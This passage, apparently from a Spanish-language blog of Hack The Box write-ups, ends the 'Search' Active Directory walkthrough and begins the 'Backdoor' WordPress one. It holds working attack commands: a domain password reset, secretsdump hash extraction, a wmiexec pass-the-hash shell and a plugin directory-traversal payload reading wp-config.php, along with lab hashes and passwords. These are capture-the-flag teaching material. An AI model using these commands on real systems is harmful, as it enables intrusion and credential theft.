la información que proporciona Bloodhound es posible realizar kerberoasting o cambiar la contraseña del usuario.\nYa que tenemos acceso como BIR-ADFS-GMSA realizamos un cambio de contraseña a tristan.\n1 Invoke-Command -ScriptBlock { net user tristan.davies Password123! /domain } -ComputerName RESEARCH -Credential $cred Observamos que el comando fue ejecutado exitosamente.\nTras ejecutar CrackMapExec vemos que tenemos acceso a todos los recursos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/search ❯ crackmapexec smb search.htb -u tristan.davies -p \u0026#39;Password123!\u0026#39; --shares SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [+] search.htb\\tristan.davies:Password123! (Pwn3d!) SMB search.htb 445 RESEARCH [+] Enumerated shares SMB search.htb 445 RESEARCH Share Permissions Remark SMB search.htb 445 RESEARCH ----- ----------- ------ SMB search.htb 445 RESEARCH ADMIN$ READ,WRITE Remote Admin SMB search.htb 445 RESEARCH C$ READ,WRITE Default share SMB search.htb 445 RESEARCH CertEnroll READ,WRITE Active Directory Certificate Services share SMB search.htb 445 RESEARCH helpdesk SMB search.htb 445 RESEARCH IPC$ READ Remote IPC SMB search.htb 445 RESEARCH NETLOGON READ,WRITE Logon server share SMB search.htb 445 RESEARCH RedirectedFolders$ READ,WRITE SMB search.htb 445 RESEARCH SYSVOL READ Logon server share π ~/htb/search ❯ Administrator Utilizamos secretsdump para obtener el hash del usuario Administrator.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/search ❯ impacket-secretsdump tristan.davies:\u0026#39;Password123!\u0026#39;@search.htb -just-dc-user Administrator Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:c870b887ebb9c0900fc3c1ef25e0592c4da89bf7eb1cf6d3064d44afb2dc86f9 Administrator:aes128-cts-hmac-sha1-96:07431caa0e0c70a2adc8f9ce43e181b1 Administrator:des-cbc-md5:52d02af1f2fba43e [*] Cleaning up... π ~/htb/search ❯ Shell Finalmente utilizando wmiexec logramos obtener una shell y la flag root.tsxt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 π ~/htb/search ❯ impacket-wmiexec administrator@search.htb -hashes aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\\u0026gt;whoami search\\administrator C:\\\u0026gt;cd Users/Administrator/Desktop C:\\Users\\Administrator\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is B8F8-6F48 Directory of C:\\Users\\Administrator\\Desktop 22/11/2021 21:21 \u0026lt;DIR\u0026gt; . 22/11/2021 21:21 \u0026lt;DIR\u0026gt; .. 09/04/2022 02:22 34 root.txt 1 File(s) 34 bytes 2 Dir(s) 2,568,282,112 bytes free C:\\Users\\Administrator\\Desktop\u0026gt;type root.txt 284a14da6bec1277cd63ff3c81d18c2e C:\\Users\\Administrator\\Desktop\u0026gt; ","description":"Tras realizar una enumeración de usuarios y encontrar credenciales en el sitio web realizamos Kerberoasting. Password Spraying nos dieron acceso a un siguiente usuario donde encontramos un archivo Excel con una lista de contraseñas, una de ellas nos dio acceso por Powershell Web. Finalmente encontramos una ruta en Bloodhound para obtener acceso a un usuario del grupo Domain Admin para finalmente acceder como Administrador.","id":29,"section":"posts","tags":["active directory","crackmapexec","IIS client certificate","kerbrute","password spraying","bloodhound","bloodhound.py","kerberoasting","xlsx2csv","powershell-web","gmsa"],"title":"Hack The Box - Search","uri":"https://sckull.github.io/posts/search/"},{"content":"\rBackdoor corre WordPress con un plugin vulnerable lo que nos permitió obtener información de los procesos en ejecución, encontramos que corre un servidor de gdb por donde accedimos a un primer usuario. Tras conectarnos a una sesion screen logramos acceso como root.\nNombre Backdoor OS Linux Puntos 20 Dificultad Facil IP 10.10.11.125 Maker hkabubaker17\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.7, 4.3, 4.7, 5.3, 5.7],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: SSH (22), HTTP (80) y waste? (1337).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # Nmap 7.91 scan initiated Sat Nov 20 21:17:54 2021 as: nmap -p22,80,1337 -sC -sV -o nmap backdoor.htb Nmap scan report for backdoor.htb (10.10.11.125) Host is up (0.085s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: WordPress 5.8.1 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Backdoor \u0026amp;#8211; Real-Life 1337/tcp open waste? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Nov 20 21:18:17 2021 -- 1 IP address (1 host up) scanned in 22.78 seconds Web Site Una solicitud de curl nos muestra en los headers algunas direcciones que pertenecen a WordPress.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/backdoor ❯ curl -sI 10.10.11.125 HTTP/1.1 200 OK Date: Sun, 28 Nov 2021 03:57:09 GMT Server: Apache/2.4.41 (Ubuntu) Link: \u0026lt;http://10.10.11.125/index.php/wp-json/\u0026gt;; rel=\u0026#34;https://api.w.org/\u0026#34; Link: \u0026lt;http://10.10.11.125/index.php/wp-json/wp/v2/pages/11\u0026gt;; rel=\u0026#34;alternate\u0026#34;; type=\u0026#34;application/json\u0026#34; Link: \u0026lt;http://10.10.11.125/\u0026gt;; rel=shortlink Content-Type: text/html; charset=UTF-8 π ~/htb/backdoor ❯ Al visitar la pagina vemos que efectivamente es un WordPress, y no muestra mayor informacion.\nWordPress Enumeramos los plugins con la opcion por default aunque no mostró nada inicialmente, por lo que cambiamos a deteccion mixta, aún asi solo muestra el plugin akismet en su version 4.2.1. Además la versión de Wordpress (5.8.1) no parece ser vulnerable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 π ~/htb/backdoor ❯ wpscan --url http://10.10.11.125/ -e p --plugins-detection mixed _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.18 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.11.125/ [10.10.11.125] [+] Started: Sun Nov 28 03:39:14 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.11.125/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09). | Found By: Rss Generator (Passive Detection) | - http://10.10.11.125/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.8.1\u0026lt;/generator\u0026gt; | - http://10.10.11.125/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.8.1\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/ | Latest Version: 2.8 (up to date) | Last Updated: 2021-07-22T00:00:00.000Z | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.8 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: \u0026#39;Version: 2.8\u0026#39; [+] Enumerating Most Popular Plugins (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:26 \u0026lt;==========================================================================================================\u0026gt; (1499 / 1499) 100.00% Time: 00:00:26 [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] akismet | Location: http://10.10.11.125/wp-content/plugins/akismet/ | Latest Version: 4.2.1 | Last Updated: 2021-10-01T18:28:00.000Z | | Found By: Known Locations (Aggressive Detection) | - http://10.10.11.125/wp-content/plugins/akismet/, status: 403 | | The version could not be determined. [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Nov 28 03:39:43 2021 [+] Requests Done: 1505 [+] Cached Requests: 36 [+] Data Sent: 412.582 KB [+] Data Received: 269.619 KB [+] Memory used: 260 MB [+] Elapsed time: 00:00:29 π ~/htb/backdoor ❯ Directory Traversal El plugin akismet no parece tener algun tipo de vulnerabilidad, aún asi, en la carpeta o directorio de plugins se muestra ebook-download.\nSi accedemos al readme.txt vemos que permite la descarga de archivos. Al investigar un poco acerca de este plugin encontramos que permite acceder a cualquier directorio de la maquina. Si realizamos una solicitud con curl el resultado es el archivo wp-config.php donde vemos las credenciales de la base de datos de WordPress.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 π ~/htb/backdoor ❯ curl -s \u0026#34;10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php\u0026#34;|grep -v \u0026#34;*\u0026#34; ../../../wp-config.php../../../wp-config.php../../../wp-config.php\u0026lt;?php define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpressuser\u0026#39; ); define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;MQYBJSaD#DxG6qbm\u0026#39; ); define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39; ); define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); if ( !defined(\u0026#39;ABSPATH\u0026#39;) ) define(\u0026#39;ABSPATH\u0026#39;, dirname(__FILE__) . \u0026#39;/\u0026#39;); $currenthost = \u0026#34;http://\u0026#34;.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;]; $currentpath = preg_replace(\u0026#39;@/+$@\u0026#39;,\u0026#39;\u0026#39;,dirname($_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;])); $currentpath = preg_replace(\u0026#39;/\\/wp.+/\u0026#39;,\u0026#39;\u0026#39;,$currentpath); define(\u0026#39;WP_HOME\u0026#39;,$currenthost.$currentpath); define(\u0026#39;WP_SITEURL\u0026#39;,$currenthost.$currentpath); define(\u0026#39;WP_CONTENT_URL\u0026#39;, $currenthost.$currentpath.\u0026#39;/wp-content\u0026#39;); define(\u0026#39;WP_PLUGIN_URL\u0026#39;, $currenthost.$currentpath.\u0026#39;/wp-content/plugins\u0026#39;); define(\u0026#39;DOMAIN_CURRENT_SITE\u0026#39;, $currenthost.$currentpath ); @define(\u0026#39;ADMIN_COOKIE_PATH\u0026#39;, \u0026#39;./\u0026#39;); define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); $table_prefix = \u0026#39;wp_\u0026#39;; define( \u0026#39;WP_DEBUG\u0026#39;, false ); if ( ! defined( \u0026#39;ABSPATH\u0026#39; ) ) { define( \u0026#39;ABSPATH\u0026#39;, __DIR__ . \u0026#39;/\u0026#39; ); } require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;; \u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; π ~/htb/backdoor ❯ Sabiendo que podemos acceder a cualquier archivo de la maquina utilizamos un wordlist para enumerar los archivos e informacion sensible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 π ~/htb/backdoor ❯ ffuf -c -w LFI_paths.txt -u \u0026#34;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../FUZZ\u0026#34; -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../FUZZ :: Wordlist : FUZZ: LFI_paths.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 1 ________________________________________________ /etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 1072, Words: 115, Lines: 25] /etc/apache2/mods-available/ssl.conf [Status: 200, Size: 3339, Words: 431, Lines: 86] /etc/apache2/ports.conf [Status: 200, Size: 510, Words: 36, Lines: 16] /etc/apache2/mods-available/setenvif.conf [Status: 200, Size: 1524, Words: 113, Lines: 33] /etc/apache2/mods-enabled/status.conf [Status: 200, Size: 981, Words: 82, Lines: 30] /etc/apache2/mods-available/proxy.conf [Status: 200, Size: 1057, Words: 124, Lines: 28] /etc/apache2/mods-available/mime.conf [Status: 200, Size: 7908, Words: 943, Lines: 252] /etc/bash.bashrc [Status: 200, Size: 2488, Words: 399, Lines: 72] /etc/ca-certificates.conf [Status: 200, Size: 6766, Words: 64, Lines: 161] /etc/ca-certificates.conf.dpkg-old [Status: 200, Size: 6792, Words: 64, Lines: 161] /etc/apache2/mods-available/dir.conf [Status: 200, Size: 386, Words: 15, Lines: 6] /etc/crontab [Status: 200, Size: 1199, Words: 181, Lines: 23] /etc/crypttab [Status: 200, Size: 214, Words: 5, Lines: 2] [.. snip ..] /proc/cpuinfo [Status: 200, Size: 2354, Words: 271, Lines: 57] /proc/devices [Status: 200, Size: 711, Words: 97, Lines: 61] /proc/meminfo [Status: 200, Size: 1635, Words: 515, Lines: 54] /proc/net/tcp [Status: 200, Size: 1210, Words: 369, Lines: 8] /proc/net/udp [Status: 200, Size: 544, Words: 101, Lines: 4] /proc/self/stat [Status: 200, Size: 483, Words: 52, Lines: 2] /proc/self/mounts [Status: 200, Size: 2841, Words: 181, Lines: 37] /proc/self/status [Status: 200, Size: 1524, Words: 93, Lines: 56] /proc/version [Status: 200, Size: 310, Words: 17, Lines: 2] /usr/share/adduser/adduser.conf [Status: 200, Size: 3242, Words: 402, Lines: 89] /var/www/html/wp-config.php [Status: 200, Size: 3971, Words: 484, Lines: 113] :: Progress: [1014/1014] :: Job [1/1] :: 121 req/sec :: Duration: [0:00:08] :: Errors: 0 :: π ~/htb/backdoor ❯ User - User Proc - Enumeration Archivos de configuracion no mostraron mucha información, pero vemos /proc e investigando acerca de estos archivos, especificamente de net/tcp vemos que es posible decodificar su contenido y ver que puertos estan a la escucha localmente. Utilizando un script de perl vemos que existe el puerto 1337 aun asi este puerto no muestra ninguna informacion al conectarnos con netcat pero aún asi aparece abierto en nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 π ~/htb/backdoor ❯ cat tcp_proc sl local_address rem_address st tx_queue rx_queue tr tm-\u0026gt;when retrnsmt uid timeout inode 0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000 101 0 31157 1 0000000000000000 100 0 0 10 0 1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 32750 1 0000000000000000 100 0 0 10 0 2: 00000000:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000 1000 0 35407 1 0000000000000000 100 0 0 10 0 3: 0100007F:8124 00000000:0000 0A 00000000:00000000 00:00000000 00000000 113 0 36357 1 0000000000000000 100 0 0 10 0 4: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000 113 0 36359 1 0000000000000000 100 0 0 10 0 5: 7D0B0A0A:D15E 01010101:0035 02 00000001:00000000 01:00000000 00000002 101 0 41859 2 0000000000000000 400 0 0 1 7 π ~/htb/backdoor ❯ cat tcp_proc| cut -d \u0026#39; \u0026#39; -f5| tr \u0026#39;:\u0026#39; \u0026#39; \u0026#39; | tail --lines +2 \u0026gt; local_address π ~/htb/backdoor ❯ while read line; do echo \u0026#34;./proc_net.pl $line\u0026#34;|bash; done \u0026lt; local_address hex: 3500007F IP: 127.0.0.53 PORT: 53 hex: 00000000 IP: 0.0.0.0 PORT: 22 hex: 00000000 IP: 0.0.0.0 PORT: 1337 hex: 0100007F IP: 127.0.0.1 PORT: 33060 hex: 0100007F IP: 127.0.0.1 PORT: 3306 hex: 7D0B0A0A IP: 10.10.11.125 PORT: 53598 π ~/htb/backdoor ❯ π ~/htb/backdoor ❯ nc 10.10.11.125 1337 -vvv backdoor.htb [10.10.11.125] 1337 (?) open ^C sent 0, rcvd 0 π ~/htb/backdoor ❯ nmap -p 1337 10.10.11.125 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 04:24 UTC Nmap scan report for backdoor.htb (10.10.11.125) Host is up (0.075s latency). PORT STATE SERVICE 1337/tcp open waste Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds π ~/htb/backdoor ❯ Investigando un poco más sobre Directory Traversal encontramos un post que explica que es posible obtener informacion leyendo los archivos /proc los cuales pueden tener mucha informacion acerca de los procesos en ejecucion, variables, directorios, configuracion, etc. Inicialmente obtuvimos el archivo /proc/sched_debug el cual nos mostró todos los procesos incluyendo el PID de cada uno de estos (full output en pestaña 2), vemos algunos interesantes, como cron, sh, sleep y true.\nbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 task PID tree-key switches prio wait-time sum-exec sum-sleep ----------------------------------------------------------------------------------------------------------- S systemd 1 519.671425 3021 120 0.000000 1440.110160 0.000000 0 0 /autogroup-2 S kthreadd 2 19854.750146 289 120 0.000000 3.772400 0.000000 0 0 / [.. snip ..] S rs:main Q:Reg 843 65.688422 2311 120 0.000000 82.416140 0.000000 0 0 /autogroup-44 S systemd-logind 772 51.786524 353 120 0.000000 57.482730 0.000000 0 0 /autogroup-43 S cron 795 23.500787 86 120 0.000000 9.187460 0.000000 0 0 /autogroup-53 S cron 797 4.951889 22 120 0.000000 2.347230 0.000000 0 0 /autogroup-53 S cron 798 4.063958 28 120 0.000000 1.866590 0.000000 0 0 /autogroup-53 S sh 822 6.096762 3 120 0.000000 0.875700 0.000000 0 0 /autogroup-63 S atd 831 0.698262 5 120 0.000000 1.947490 0.000000 0 0 /autogroup-65 S apache2 919 503.996756 4080 120 0.000000 204.206630 0.000000 0 0 /autogroup-78 S polkitd 952 0.967613 45 120 0.000000 6.252250 0.000000 0 0 /autogroup-79 S gmain 957 0.219552 2 120 0.000000 0.054380 0.000000 0 0 /autogroup-79 S gdbus 959 2.391570 30 120 0.000000 2.256970 0.000000 0 0 /autogroup-79 S mysqld 982 1454.947024 201 120 0.000000 950.670570 0.000000 0 0 /autogroup-82 S ib_io_wr-1 999 2132.449254 8058 120 0.000000 147.278470 0.000000 0 0 /autogroup-82 S ib_io_wr-2 1000 2132.434954 8073 120 0.000000 100.577020 0.000000 0 0 /autogroup-82 S ib_pg_flush_co 1003 2132.461204 4153 120 0.000000 146.851890 0.000000 0 0 /autogroup-82 Sib_log_fl_notif 1005 2138.469534 40602 120 0.000000 761.835450 0.000000 0 0 /autogroup-82 S ib_log_flush 1006 2132.462634 40721 120 0.000000 525.424850 0.000000 0 0 /autogroup-82 Sib_log_wr_notif 1007 2132.459704 40597 120 0.000000 698.855610 0.000000 0 0 /autogroup-82 S ib_log_writer 1008 2132.484224 40629 120 0.000000 531.424940 0.000000 0 0 /autogroup-82 S ib_srv_lock_to 1029 2132.404864 4002 120 0.000000 85.624910 0.000000 0 0 /autogroup-82 S ib_srv_err_mon 1030 2132.395744 4001 120 0.000000 79.468610 0.000000 0 0 /autogroup-82 S ib_src_main 1033 2132.532934 4003 120 0.000000 268.500730 0.000000 0 0 /autogroup-82 S ib_dict_stats 1034 2132.340934 401 120 0.000000 11.093740 0.000000 0 0 /autogroup-82 S ib_fts_opt 1035 2132.366374 802 120 0.000000 22.894900 0.000000 0 0 /autogroup-82 S xpl_worker-1 1038 2122.324314 67 120 0.000000 1.556280 0.000000 0 0 /autogroup-82 S xpl_worker-2 1039 2122.327704 67 120 0.000000 0.984690 0.000000 0 0 /autogroup-82 S xpl_accept-1 1040 1256.510815 3 120 0.000000 0.024590 0.000000 0 0 /autogroup-82 S ib_buf_dump 1044 1224.615357 4 120 0.000000 0.996910 0.000000 0 0 /autogroup-82 S ib_clone_gtid 1045 2132.469694 40000 120 0.000000 698.268460 0.000000 0 0 /autogroup-82 S ib_srv_wkr-3 1049 1473.419354 381 120 0.000000 16.402710 0.000000 0 0 /autogroup-82 S evt_sched 1050 1258.486107 1 120 0.000000 0.555790 0.000000 0 0 /autogroup-82 S sig_handler 1051 1272.678439 4 120 0.000000 0.045260 0.000000 0 0 /autogroup-82 S xpl_accept-2 1052 2132.400884 4487 120 0.000000 140.123980 0.000000 0 0 /autogroup-82 S gtid_zip 1054 1272.680619 2 120 0.000000 0.173790 0.000000 0 0 /autogroup-82 S connection 2745 1456.449824 263 120 0.000000 77.094580 0.000000 0 0 /autogroup-82 S connection 2746 1466.696594 424 120 0.000000 67.397070 0.000000 0 0 /autogroup-82 I kworker/u256:1 3732 20371.992915 8245 120 0.000000 177.224550 0.000000 0 0 / S apache2 4991 487.566296 35 120 0.000000 14.617150 0.000000 0 0 /autogroup-78 S apache2 5001 495.637356 29 120 0.000000 13.318640 0.000000 0 0 /autogroup-78 S apache2 5002 493.276976 30 120 0.000000 11.690060 0.000000 0 0 /autogroup-78 S apache2 5006 493.332166 28 120 0.000000 8.924860 0.000000 0 0 /autogroup-78 S apache2 5015 487.958556 25 120 0.000000 10.375860 0.000000 0 0 /autogroup-78 S apache2 5027 487.279166 25 120 0.000000 7.637470 0.000000 0 0 /autogroup-78 I kworker/1:2 9006 20397.858690 7396 120 0.000000 488.829440 0.000000 0 0 / I kworker/u256:0 9394 20397.344230 1827 120 0.000000 35.668860 0.000000 0 0 / t true 9964 11.181754 5 120 0.000000 0.892650 0.000000 0 0 /autogroup-97 I kworker/1:1 9970 19866.729543 2 120 0.000000 0.002290 0.000000 0 0 / S sleep 11031 31681.982737 1 120 0.000000 0.917290 0.000000 0 0 /autogroup-56 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 